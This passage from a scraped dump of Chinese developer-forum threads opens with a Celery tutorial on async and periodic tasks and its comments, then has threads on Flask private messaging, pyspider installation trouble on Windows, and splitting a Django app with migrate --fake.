<code>@app.task</code> 装饰后，就成为可被 Celery 调度的任务；</li>\n</ul>\n<h3>启动 Celery Worker</h3>\n<p>在当前目录，使用如下方式启动 Celery Worker ：</p>\n<pre><code>$ celery worker -A tasks --loglevel=info\n</code></pre>\n<p>其中：</p>\n<ul>\n<li>参数 <code>-A</code> 指定了 Celery 实例的位置，本例是在 <code><a href=\"http://tasks.py\" rel=\"nofollow\">tasks.py</a></code> 中， Celery 会自动在该文件中寻找 Celery 对象实例，当然，我们也可以自己指定，在本例，使用 <code>-A tasks.app</code>；</li>\n<li>参数 <code>--loglevel</code> 指定了日志级别，默认为 warning ，也可以使用 <code>-l info</code> 来表示；</li>\n</ul>\n<p>在生产环境中，我们通常会使用 <a href=\"http://supervisord.org/\" rel=\"nofollow\">Supervisor</a> 来控制 Celery Worker 进程。</p>\n<p>启动成功后，控制台会显示如下输出：</p>\n<p><img alt=\"celery\" src=\"https://ooo.0o0.ooo/2016/12/10/584b7da9f2c17.png\"></p>\n<h3>调用任务</h3>\n<p>现在，我们可以在应用程序中使用 <code>delay()</code> 或 <code>apply_async()</code> 方法来调用任务。</p>\n<p>在当前目录打开 Python 控制台，输入以下代码：</p>\n<pre><code>&gt;&gt;&gt; from tasks import add\n&gt;&gt;&gt; add.delay(2, 8)\n&lt;AsyncResult: 2272ddce-8be5-493f-b5ff-35a0d9fe600f&gt;\n</code></pre>\n<p>在上面，我们从 <code><a href=\"http://tasks.py\" rel=\"nofollow\">tasks.py</a></code> 文件中导入了 <code>add</code> 任务对象，然后使用 <code>delay()</code> 方法将任务发送到消息中间件（ Broker ）， Celery Worker 进程监控到该任务后，就会进行执行。我们将窗口切换到 Worker 的启动窗口，会看到多了两条日志：</p>\n<pre><code>[2016-12-10 12:00:50,376: INFO/MainProcess] Received task: tasks.add[2272ddce-8be5-493f-b5ff-35a0d9fe600f]\n[2016-12-10 12:00:55,385: INFO/PoolWorker-4] Task tasks.add[2272ddce-8be5-493f-b5ff-35a0d9fe600f] succeeded in 5.00642602402s: 10\n</code></pre>\n<p>这说明任务已经被调度并执行成功。</p>\n<p>另外，我们如果想获取执行后的结果，可以这样做：</p>\n<pre><code>&gt;&gt;&gt; result = add.delay(2, 6)\n&gt;&gt;&gt; result.ready()   # 使用 ready() 判断任务是否执行完毕\nFalse\n&gt;&gt;&gt; result.ready()\nFalse\n&gt;&gt;&gt; result.ready()\nTrue\n&gt;&gt;&gt; result.get()     # 使用 get() 获取任务结果\n8\n</code></pre>\n<p>在上面，我们是在 Python 的环境中调用任务。事实上，我们通常在应用程序中调用任务。比如，将下面的代码保存为 <code><a href=\"http://client.py\" rel=\"nofollow\">client.py</a></code>:</p>\n<pre><code># -*- coding: utf-8 -*-\n\nfrom tasks import add\n\n# 异步任务\nadd.delay(2, 8)\n\nprint 'hello world'\n</code></pre>\n<p>运行命令 <code>$ python <a href=\"http://client.py\" rel=\"nofollow\">client.py</a></code>，可以看到，虽然任务函数 <code>add</code> 需要等待 5 秒才返回执行结果，但由于它是一个异步任务，不会阻塞当前的主程序，因此主程序会往下执行 <code>print</code> 语句，打印出结果。</p>\n<h2>使用配置</h2>\n<p>在上面的例子中，我们直接把 Broker 和 Backend 的配置写在了程序当中，更好的做法是将配置项统一写入到一个配置文件中，通常我们将该文件命名为 <code><a href=\"http://celeryconfig.py\" rel=\"nofollow\">celeryconfig.py</a></code>。 Celery 的配置比较多，可以在<a href=\"http://docs.celeryproject.org/en/latest/userguide/configuration.html\" rel=\"nofollow\">官方文档</a>查询每个配置项的含义。</p>\n<p>下面，我们再看一个例子。项目结构如下：</p>\n<pre><code>celery_demo                    # 项目根目录\n    ├── celery_app             # 存放 celery 相关文件\n    │   ├── __init__.py\n    │   ├── celeryconfig.py    # 配置文件\n    │   ├── task1.py           # 任务文件 1\n    │   └── task2.py           # 任务文件 2\n    └── client.py              # 应用程序\n</code></pre>\n<p><code><a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></code> 代码如下：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nfrom celery import Celery\n\napp = Celery('demo')                                # 创建 Celery 实例\napp.config_from_object('celery_app.celeryconfig')   # 通过 Celery 实例加载配置模块\n</code></pre>\n<p><code><a href=\"http://celeryconfig.py\" rel=\"nofollow\">celeryconfig.py</a></code> 代码如下：</p>\n<pre><code>BROKER_URL = 'redis://127.0.0.1:6379'               # 指定 Broker\nCELERY_RESULT_BACKEND = 'redis://127.0.0.1:6379/0'  # 指定 Backend\n\nCELERY_TIMEZONE='Asia/Shanghai'                     # 指定时区，默认是 UTC\n# CELERY_TIMEZONE='UTC'                             \n\nCELERY_IMPORTS = (                                  # 指定导入的任务模块\n    'celery_app.task1',\n    'celery_app.task2'\n)\n</code></pre>\n<p><code><a href=\"http://task1.py\" rel=\"nofollow\">task1.py</a></code> 代码如下：</p>\n<pre><code>import time\nfrom celery_app import app\n\n@app.task\ndef add(x, y):\n    time.sleep(2)\n    return x + y\n</code></pre>\n<p><code><a href=\"http://task2.py\" rel=\"nofollow\">task2.py</a></code> 代码如下：</p>\n<pre><code>import time\nfrom celery_app import app\n\n@app.task\ndef multiply(x, y):\n    time.sleep(2)\n    return x * y\n</code></pre>\n<p><code><a href=\"http://client.py\" rel=\"nofollow\">client.py</a></code> 代码如下：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nfrom celery_app import task1\nfrom celery_app import task2\n\ntask1.add.apply_async(args=[2, 8])        # 也可用 task1.add.delay(2, 8)\ntask2.multiply.apply_async(args=[3, 7])   # 也可用 task2.multiply.delay(3, 7)\n\nprint 'hello world'\n</code></pre>\n<p>现在，让我们启动 Celery Worker 进程，在项目的根目录下执行下面命令：</p>\n<pre><code>celery_demo $ celery -A celery_app worker --loglevel=info\n</code></pre>\n<p>接着，运行 <code>$ python <a href=\"http://client.py\" rel=\"nofollow\">client.py</a></code>，它会发送两个异步任务到 Broker ，在 Worker 的窗口我们可以看到如下输出：</p>\n<pre><code>[2016-12-10 13:51:58,939: INFO/MainProcess] Received task: celery_app.task1.add[9ccffad0-aca4-4875-84ce-0ccfce5a83aa]\n[2016-12-10 13:51:58,941: INFO/MainProcess] Received task: celery_app.task2.multiply[64b1f889-c892-4333-bd1d-ac667e677a8a]\n[2016-12-10 13:52:00,948: INFO/PoolWorker-3] Task celery_app.task1.add[9ccffad0-aca4-4875-84ce-0ccfce5a83aa] succeeded in 2.00600231002s: 10\n[2016-12-10 13:52:00,949: INFO/PoolWorker-4] Task celery_app.task2.multiply[64b1f889-c892-4333-bd1d-ac667e677a8a] succeeded in 2.00601326401s: 21\n</code></pre>\n<h2>delay 和 apply_async</h2>\n<p>在前面的例子中，我们使用 <code>delay()</code> 或 <code>apply_async()</code> 方法来调用任务。事实上，<code>delay</code> 方法封装了 <code>apply_async</code>，如下：</p>\n<pre><code>def delay(self, *partial_args, **partial_kwargs):\n    \"\"\"Shortcut to :meth:`apply_async` using star arguments.\"\"\"\n    return self.apply_async(partial_args, partial_kwargs)\n</code></pre>\n<p>也就是说，<code>delay</code> 是使用 <code>apply_async</code> 的快捷方式。<code>apply_async</code> 支持更多的参数，它的一般形式如下：</p>\n<pre><code>apply_async(args=(), kwargs={}, route_name=None, **options)\n</code></pre>\n<p>apply_async 常用的参数如下：</p>\n<ul>\n<li>countdown ：指定多少秒后执行任务</li>\n</ul>\n<pre><code>task1.apply_async(args=(2, 3), countdown=5)    # 5 秒后执行任务\n</code></pre>\n<ul>\n<li>eta (estimated time of arrival)：指定任务被调度的具体时间，参数类型是 datetime</li>\n</ul>\n<pre><code>from datetime import datetime, timedelta\n\n# 当前 UTC 时间再加 10 秒后执行任务\ntask1.multiply.apply_async(args=[3, 7], eta=datetime.utcnow() + timedelta(seconds=10))\n</code></pre>\n<ul>\n<li>expires ：任务过期时间，参数类型可以是 int ，也可以是 datetime</li>\n</ul>\n<pre><code>task1.multiply.apply_async(args=[3, 7], expires=10)    # 10 秒后过期\n</code></pre>\n<p>更多的参数列表可以在<a href=\"http://docs.celeryproject.org/en/latest/reference/celery.app.task.html#celery.app.task.Task.apply_async\" rel=\"nofollow\">官方文档</a>中查看。</p>\n<h1>定时任务</h1>\n<p>Celery 除了可以执行<strong>异步任务</strong>，也支持执行<strong>周期性任务（ Periodic Tasks ）</strong>，或者说定时任务。 Celery Beat 进程通过读取配置文件的内容，周期性地将定时任务发往任务队列。</p>\n<p>让我们看看例子，项目结构如下：</p>\n<pre><code>celery_demo                    # 项目根目录\n    ├── celery_app             # 存放 celery 相关文件\n        ├── __init__.py\n        ├── celeryconfig.py    # 配置文件\n        ├── task1.py           # 任务文件\n        └── task2.py           # 任务文件\n</code></pre>\n<p><code><a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></code> 代码如下：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nfrom celery import Celery\n\napp = Celery('demo')\napp.config_from_object('celery_app.celeryconfig')\n</code></pre>\n<p><code><a href=\"http://celeryconfig.py\" rel=\"nofollow\">celeryconfig.py</a></code> 代码如下：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nfrom datetime import timedelta\nfrom celery.schedules import crontab\n\n# Broker and Backend\nBROKER_URL = 'redis://127.0.0.1:6379'\nCELERY_RESULT_BACKEND = 'redis://127.0.0.1:6379/0'\n\n# Timezone\nCELERY_TIMEZONE='Asia/Shanghai'    # 指定时区，不指定默认为 'UTC'\n# CELERY_TIMEZONE='UTC'\n\n# import\nCELERY_IMPORTS = (\n    'celery_app.task1',\n    'celery_app.task2'\n)\n\n# schedules\nCELERYBEAT_SCHEDULE = {\n    'add-every-30-seconds': {\n         'task': 'celery_app.task1.add',\n         'schedule': timedelta(seconds=30),       # 每 30 秒执行一次\n         'args': (5, 8)                           # 任务函数参数\n    },\n    'multiply-at-some-time': {\n        'task': 'celery_app.task2.multiply',\n        'schedule': crontab(hour=9, minute=50),   # 每天早上 9 点 50 分执行一次\n        'args': (3, 7)                            # 任务函数参数\n    }\n}\n</code></pre>\n<p><code><a href=\"http://task1.py\" rel=\"nofollow\">task1.py</a></code> 代码如下：</p>\n<pre><code>import time\nfrom celery_app import app\n\n@app.task\ndef add(x, y):\n    time.sleep(2)\n    return x + y\n</code></pre>\n<p><code><a href=\"http://task2.py\" rel=\"nofollow\">task2.py</a></code> 代码如下：</p>\n<pre><code>import time\nfrom celery_app import app\n\n@app.task\ndef multiply(x, y):\n    time.sleep(2)\n    return x * y\n</code></pre>\n<p>现在，让我们启动 Celery Worker 进程，在项目的根目录下执行下面命令：</p>\n<pre><code>celery_demo $ celery -A celery_app worker --loglevel=info\n</code></pre>\n<p>接着，启动 Celery Beat 进程，定时将任务发送到 Broker ，在项目根目录下执行下面命令：</p>\n<pre><code>celery_demo $ celery beat -A celery_app\ncelery beat v4.0.1 (latentcall) is starting.\n__    -    ... __   -        _\nLocalTime -&gt; 2016-12-11 09:48:16\nConfiguration -&gt;\n    . broker -&gt; redis://127.0.0.1:6379//\n    . loader -&gt; celery.loaders.app.AppLoader\n    . scheduler -&gt; celery.beat.PersistentScheduler\n    . db -&gt; celerybeat-schedule\n    . logfile -&gt; [stderr]@%WARNING\n    . maxinterval -&gt; 5.00 minutes (300s)\n</code></pre>\n<p>之后，在 Worker 窗口我们可以看到，任务 <code>task1</code> 每 30 秒执行一次，而 <code>task2</code> 每天早上 9 点 50 分执行一次。</p>\n<p>在上面，我们用两个命令启动了 Worker 进程和 Beat 进程，我们也可以将它们放在一个命令中：</p>\n<pre><code>$ celery -B -A celery_app worker --loglevel=info\n</code></pre>\n<p>Celery 周期性任务也有多个配置项，可参考<a href=\"http://docs.celeryproject.org/en/latest/userguide/periodic-tasks.html\" rel=\"nofollow\">官方文档</a>。</p>\n<h1>参考资料</h1>\n<ul>\n<li><a href=\"http://docs.celeryproject.org/en/latest/index.html\" rel=\"nofollow\">Celery - Distributed Task Queue — Celery 4.0.1 documentation</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/22304455\" rel=\"nofollow\">使用 Celery - Python 之美</a></li>\n<li><a href=\"http://www.bjhee.com/celery.html\" rel=\"nofollow\">分布式任务队列 Celery 的介绍 – 思诚之道</a></li>\n<li><a href=\"http://www.jianshu.com/p/1840035cb510\" rel=\"nofollow\">异步任务神器 Celery 简明笔记</a></li>\n</ul>\n<hr>\n<p>本文由 <a href=\"https://funhacks.net/\" rel=\"nofollow\">funhacks</a> 发表于个人博客，采用 Creative Commons BY-NC-ND 4.0 （自由转载-保持署名-非商用-禁止演绎）协议发布。</p>\n<p>非商业转载请注明作者及出处。商业转载请联系作者本人。</p>\n<p>本文标题为: 异步任务神器 Celery 简明笔记</p>\n<p>本文链接为: <a href=\"https://funhacks.net/2016/12/13/celery/\" rel=\"nofollow\">https://funhacks.net/2016/12/13/celery/</a></p>\n</div></div>"], "reply": "28", "tittle": "异步任务神器 Celery 简明笔记", "comment": ["大家都会看文档谢谢。", "不用 Twisted?", " Twisted 跟这个搭不上边", " 大家都会说废话谢谢", "celery 文档貌似还没汉化 当时用的时候发现的。。。\r", "尝试了下 无奈英文不好 放弃了", "分享有风险。", "楼主分享一下使用经验的蛮好的啊，支持", "谢谢", "支持楼主，虽然有官方文档，但楼主这篇写的不错", "差点把楼主的域名看成 f**k 。。（捂脸", "写得挺好的", "支持自己写 Tutorials", "先收藏一个，虽然已经会用了。", "Celery Beat 不能跟 gevent 类型额 worker 同时使用", "broker 请尽量使用 rabbitmq ， redis 有丢任务的风险， rabbitmq 跟 redis 虽然都是官方支持，但是显然是 rabbitmq 的支持更好，而且 amqp 协议在协议层使得 Broker 可以感知消息消费的情况。当你们上 celery 的时候，请尽量使用 rabbitmq ，那会少很多坑，而且各种监控也比较完善", "celery_demo $ celery -A celery_app worker --loglevel=info\r", "执行这个的时候， \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.py\", line 37, in import_module\r", "    __import__(name)\r", "ImportError: No module named celery", "收藏一下 写得挺好的", " beat 和 gevent 一起用了很多年了，我还没发现有啥问题", " ，是的。", " ，你还没装 celery 吧。", "感谢分享。受益匪浅。", " 是加-B 吗？", " 我这里日常是单独一个 beat ；-B 是 beat 和 worker 混合运行的，我只用过几次，并没有注意到有异常的日志哦", "非常感谢楼主的分享。不要脸的 收下了", "这个分享不错", "感谢分享", "beanstalkd 也不错", "不是不提倡全文装载的吗？自己的 blog 那就更没必要了。"]},
{"content": ["<div class=\"topic_content\">初学 web 开发，用 python+flask 做了一个很粗鄙的微博，现在想加个私信功能，不过好像没什么头绪...\r<br>\r<br>诸君能提供下这方面需要点的技能树或者解决方案么？\r<br>\r<br>谢谢！</div>"], "reply": "9", "tittle": "求教，类似微博私信那种功能如何实现", "comment": ["关键词： webIM 长连接", "就是聊天而已", " \r", "私信不是私聊吧？\r", "窝没怎么用过微博，觉得私信应该是短消息这种", " 微博的私信是一个站内信+webim 的混合物。", "私信系统大致可以分几部分：发送、存储、推送、拉取。\r", "对私信的实时性、一致性、多端一致性的要求不一样，架构和选型也会不一样。\r", "微博的私信经历了挺长的演进过程，可以参考我们组同事的这个演讲： ", " 谢谢，我去搜下。", " 好的，我去学习一下。虽然暂时只想做一个最基本的东西出来，但先拿这个开阔一下眼界也是必要的。谢谢！", "私信聊天这种功能做出来很容易，做好不容易，能高负载 /大并发 /各种网络条件不丢不乱准时送达... 这就老大难了", "如果不要求及时刷新，做一个类似于通知系统的东西就可以了， flask-notifications ？"]},
{"content": ["<div class=\"topic_content\">答：我不知道。折腾两天了，没用上。我傻。\r<br>\r<br>我先是在 win 上安装的，安装完后看了下文档，直接运行 pyspider ，然后在 web 中写代码？（一脸懵逼）\r<br>\r<br>好吧，那就命令行运行 pyspider ，出现如下：\r<br><img src=\"http://ww3.sinaimg.cn/large/0060lm7Tgw1fapcxidmasj30hs02e3zb.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>\r<br>（此时我以为这就行了）\r<br>打开 localhost:5000 ，无法连接？什么鬼？\r<br>\r<br>卸载重装，又重启系统，终于成功一次，原来后面还有……\r<br>\r<br>打开后没样式，看了下是又拍云的 cdn 不行，挂上梯子解决。\r<br>\r<br>总算是没问题了，赶紧 create 一个试试吧，用的 demo ，运行后：\r<br><img src=\"http://ww3.sinaimg.cn/large/0060lm7Tgw1fapdnfei68j30gq04ndgs.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>\r<br>网络问题？应该不是，因为我直接访问 start_url 是可以打开的，并且我也挂了全局梯子（ 127.0.0.1 不走代理），也是不行。\r<br>\r<br>这个问题到目前为止都没解决，心想难道是 win 系统问题？问了下别人，别人也说有这个问题，但只是偶尔出现，并非像我一样一直是这样。\r<br>\r<br>那我换到 linux 下试试吧， centos7 ， virtualenv ……\r<br>\r<br>进入虚拟环境，继续命令行 pyspider ，这次直接报了一大堆错，挨个看，系统编码不行啊、没有 sqite3 模块啊（说是我编译 py3 的时候没弄完整，需要卸载 py3 重新编译，想想那个麻烦的过程，还是不编译了……）\r<br>\r<br>再次回到 win 下，结果就一直如图一，直接打不开了……\r<br>\r<br>累……\r<br>\r<br>希望有碰到过这种情况的同学能告知下，万分感激！</div>"], "reply": "25", "tittle": "pyspider 是最好用的爬虫之一？", "comment": ["心疼楼主", "刚在 Mac 上试了一下， 30s 搞定\r", "\r", "pip install pyspider\r", "pyspider\r", "浏览器打开， done\r", "\r", "另外 PySpider 不需要 Python3....虽然兼容 3", "我是真不会用 windows", "心疼楼主，我以前在 windows 上折腾的时候，也是各种报错。后来配了 mac 瞬间搞定", "心疼 lz ， ubuntu 上.....  30s 就 ok 了", "pip install ...", " 我也心疼自己\r", "\r", " 我在 mac 上试了下，发现 mac 的 py 版本 2.7 ，下载了个 py3 的包，安装完不知道咋用，刚吃饭回来继续搞，确实支持 2 和 3 ，主要是我一开始用的就是 3 ，没用过 2 ，用 2 安装完 pyspider 不知道能不能写 3 的代码？\r", "\r", " 哈哈，没想到作者也来了，我是用 win 习惯了， mac 倒是有点不熟悉， win 上环境确实各种问题，唉，不说了\r", "\r", " 我再试试 mac\r", " 我在 centos 上弄也是挺多问题，主要是环境依赖，挺折腾人的，一会我装个 ubuntu 试试， 30sOK 不了回来打你\r", "\r", " 这样是不行滴亲……", "作者出现了！", "python 的 80% 新手问题是 windows 导致的。剩下的 80%又是编码或者路径问题。再剩下 80%的又是对语法和姿势不熟悉导致的", "说到底都是自己的问题，基础不牢靠。", " mac 下完美解决", "arch 网速缓慢 一分钟搞定", "惊现作者", "如果在 Windows 下折腾 Python 出现各种奇怪的问题，多半是环境问题\r", "同意 @", " 说的", " 专程来感谢一下作者，这个东西写的真不错！", " win 下面那个其实已经跑起来了，命令要输入 pyspider all ，然后回车，然后开浏览器进 WebUI", " LZ 这个应该没有跑起来，只有 result_worker 线程启动了，其他的线程没有。\r", "\r", "windows 的进程和 linux 是不一样， fork 的时候不会拷贝当前内存，导致队列等无法在进程间共享。\r", "所以 windows 下是用线程启动的，这可能导致很多不同。", " windows 下面结束的时候好像也有点问题，我在 Debian 下面跑， Ctrl+C 一按就灵，在 Win 下面，呵呵，按了还在等队列里面的都跑完，然后还一直打印输出 webui 运行在 5000 端口的提示。。。", " 还有就是我把 PhantomJS 干掉了，也会报楼主 win 下面那个提示，弄了个 VPS 小鸡跑这个抓静态网页，动态的放本地服务器跑，干掉 phantomJS 能省不少内存。。。", " phantomjs not found 是正常的， warning 而已。\r", "我不会 windows ，不了解 windows 的信号是怎么处理的。", " \r", "\r", "第一张图并没有跑起来，只是出现一个 warnning 一个 info 后就没有然后了，一直卡在这里，完整的跑起来是最后出现 0.0.0.0:5000\r", "\r", "心疼楼主+1", " 看这个标题,我以为是要撕逼了.", " ", "win7+py3.5 ， pip install pyspider ，安装完成直接打开，完全没问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一开始用 django-admin startapp 建了一个，随着开发，发现其中一个地方功能比较多，适合分出来做成另一个独立的 app ，请问如何将原有的这个拆出来呢？</p>\n<p>views urls 都比较好搞，主要问题是 models ，如果移动了位置，会产生新的 migrations ，但其实数据的表结构是没有变的……</p>\n</div></div>", "<div class=\"topic_content\">已解决。\r<br>\r<br>谢谢大家，已经解决，分享一下方案。\r<br>\r<br>0.将 app 分离出来，重构代码\r<br>1.用 db_table 指定和原来的表名字相同\r<br>2.makemigrations\r<br>3.用--fake 执行 migrate ， fake 过程中中遇到引用这个表的外键的时候，问是否决定删除相关 table ， yes 就可以，因为这个时候依然是在 fake</div>"], "reply": "13", "tittle": "Django 如何将一个 app 拆成两个 app？", "comment": ["models 不需要移动的， import 就好", " 但是有个 model 太大了，里面的东西也是原来的 app 相关的，比较想拆出来", "如果移动了位置，会产生新的 migrations ，但其实数据的表结构是没有变的……\r", "=============================================\r", "./manage.py migrate --fake\r", "\r", "--fake 就是让它以为已经 migrate 了,但是不真正的去操作数据库.", "移动 model 产生新的 migration ，会导致数据库的表名也改变。可以在新的 app model 里边明确指定表名为原来 model 的表名就行了", " 对，这可能是我出错的原因，我试试移动之后改一下这个，多谢！", " 好像 makemigrations 这一步也会出错", " make 的时候如果出错，可以看是什么错，直接改对应的 migrate 文件，这种做法可以止血，但治标不治本", " 建议把 models 和 app 分开， models 直接放到一个 common_app 里边，业务逻辑 app 都分出去，这样做清静，不过貌似不符合 django 推荐的规范:)", " 也是一种好办法 ：）", "要不就 model 使用第三方 plugin 监控 history 咯", "定义 db_table 也没用么？", " 有用了 谢谢", "只想補一句，重構前把 unittest 寫好"]}
]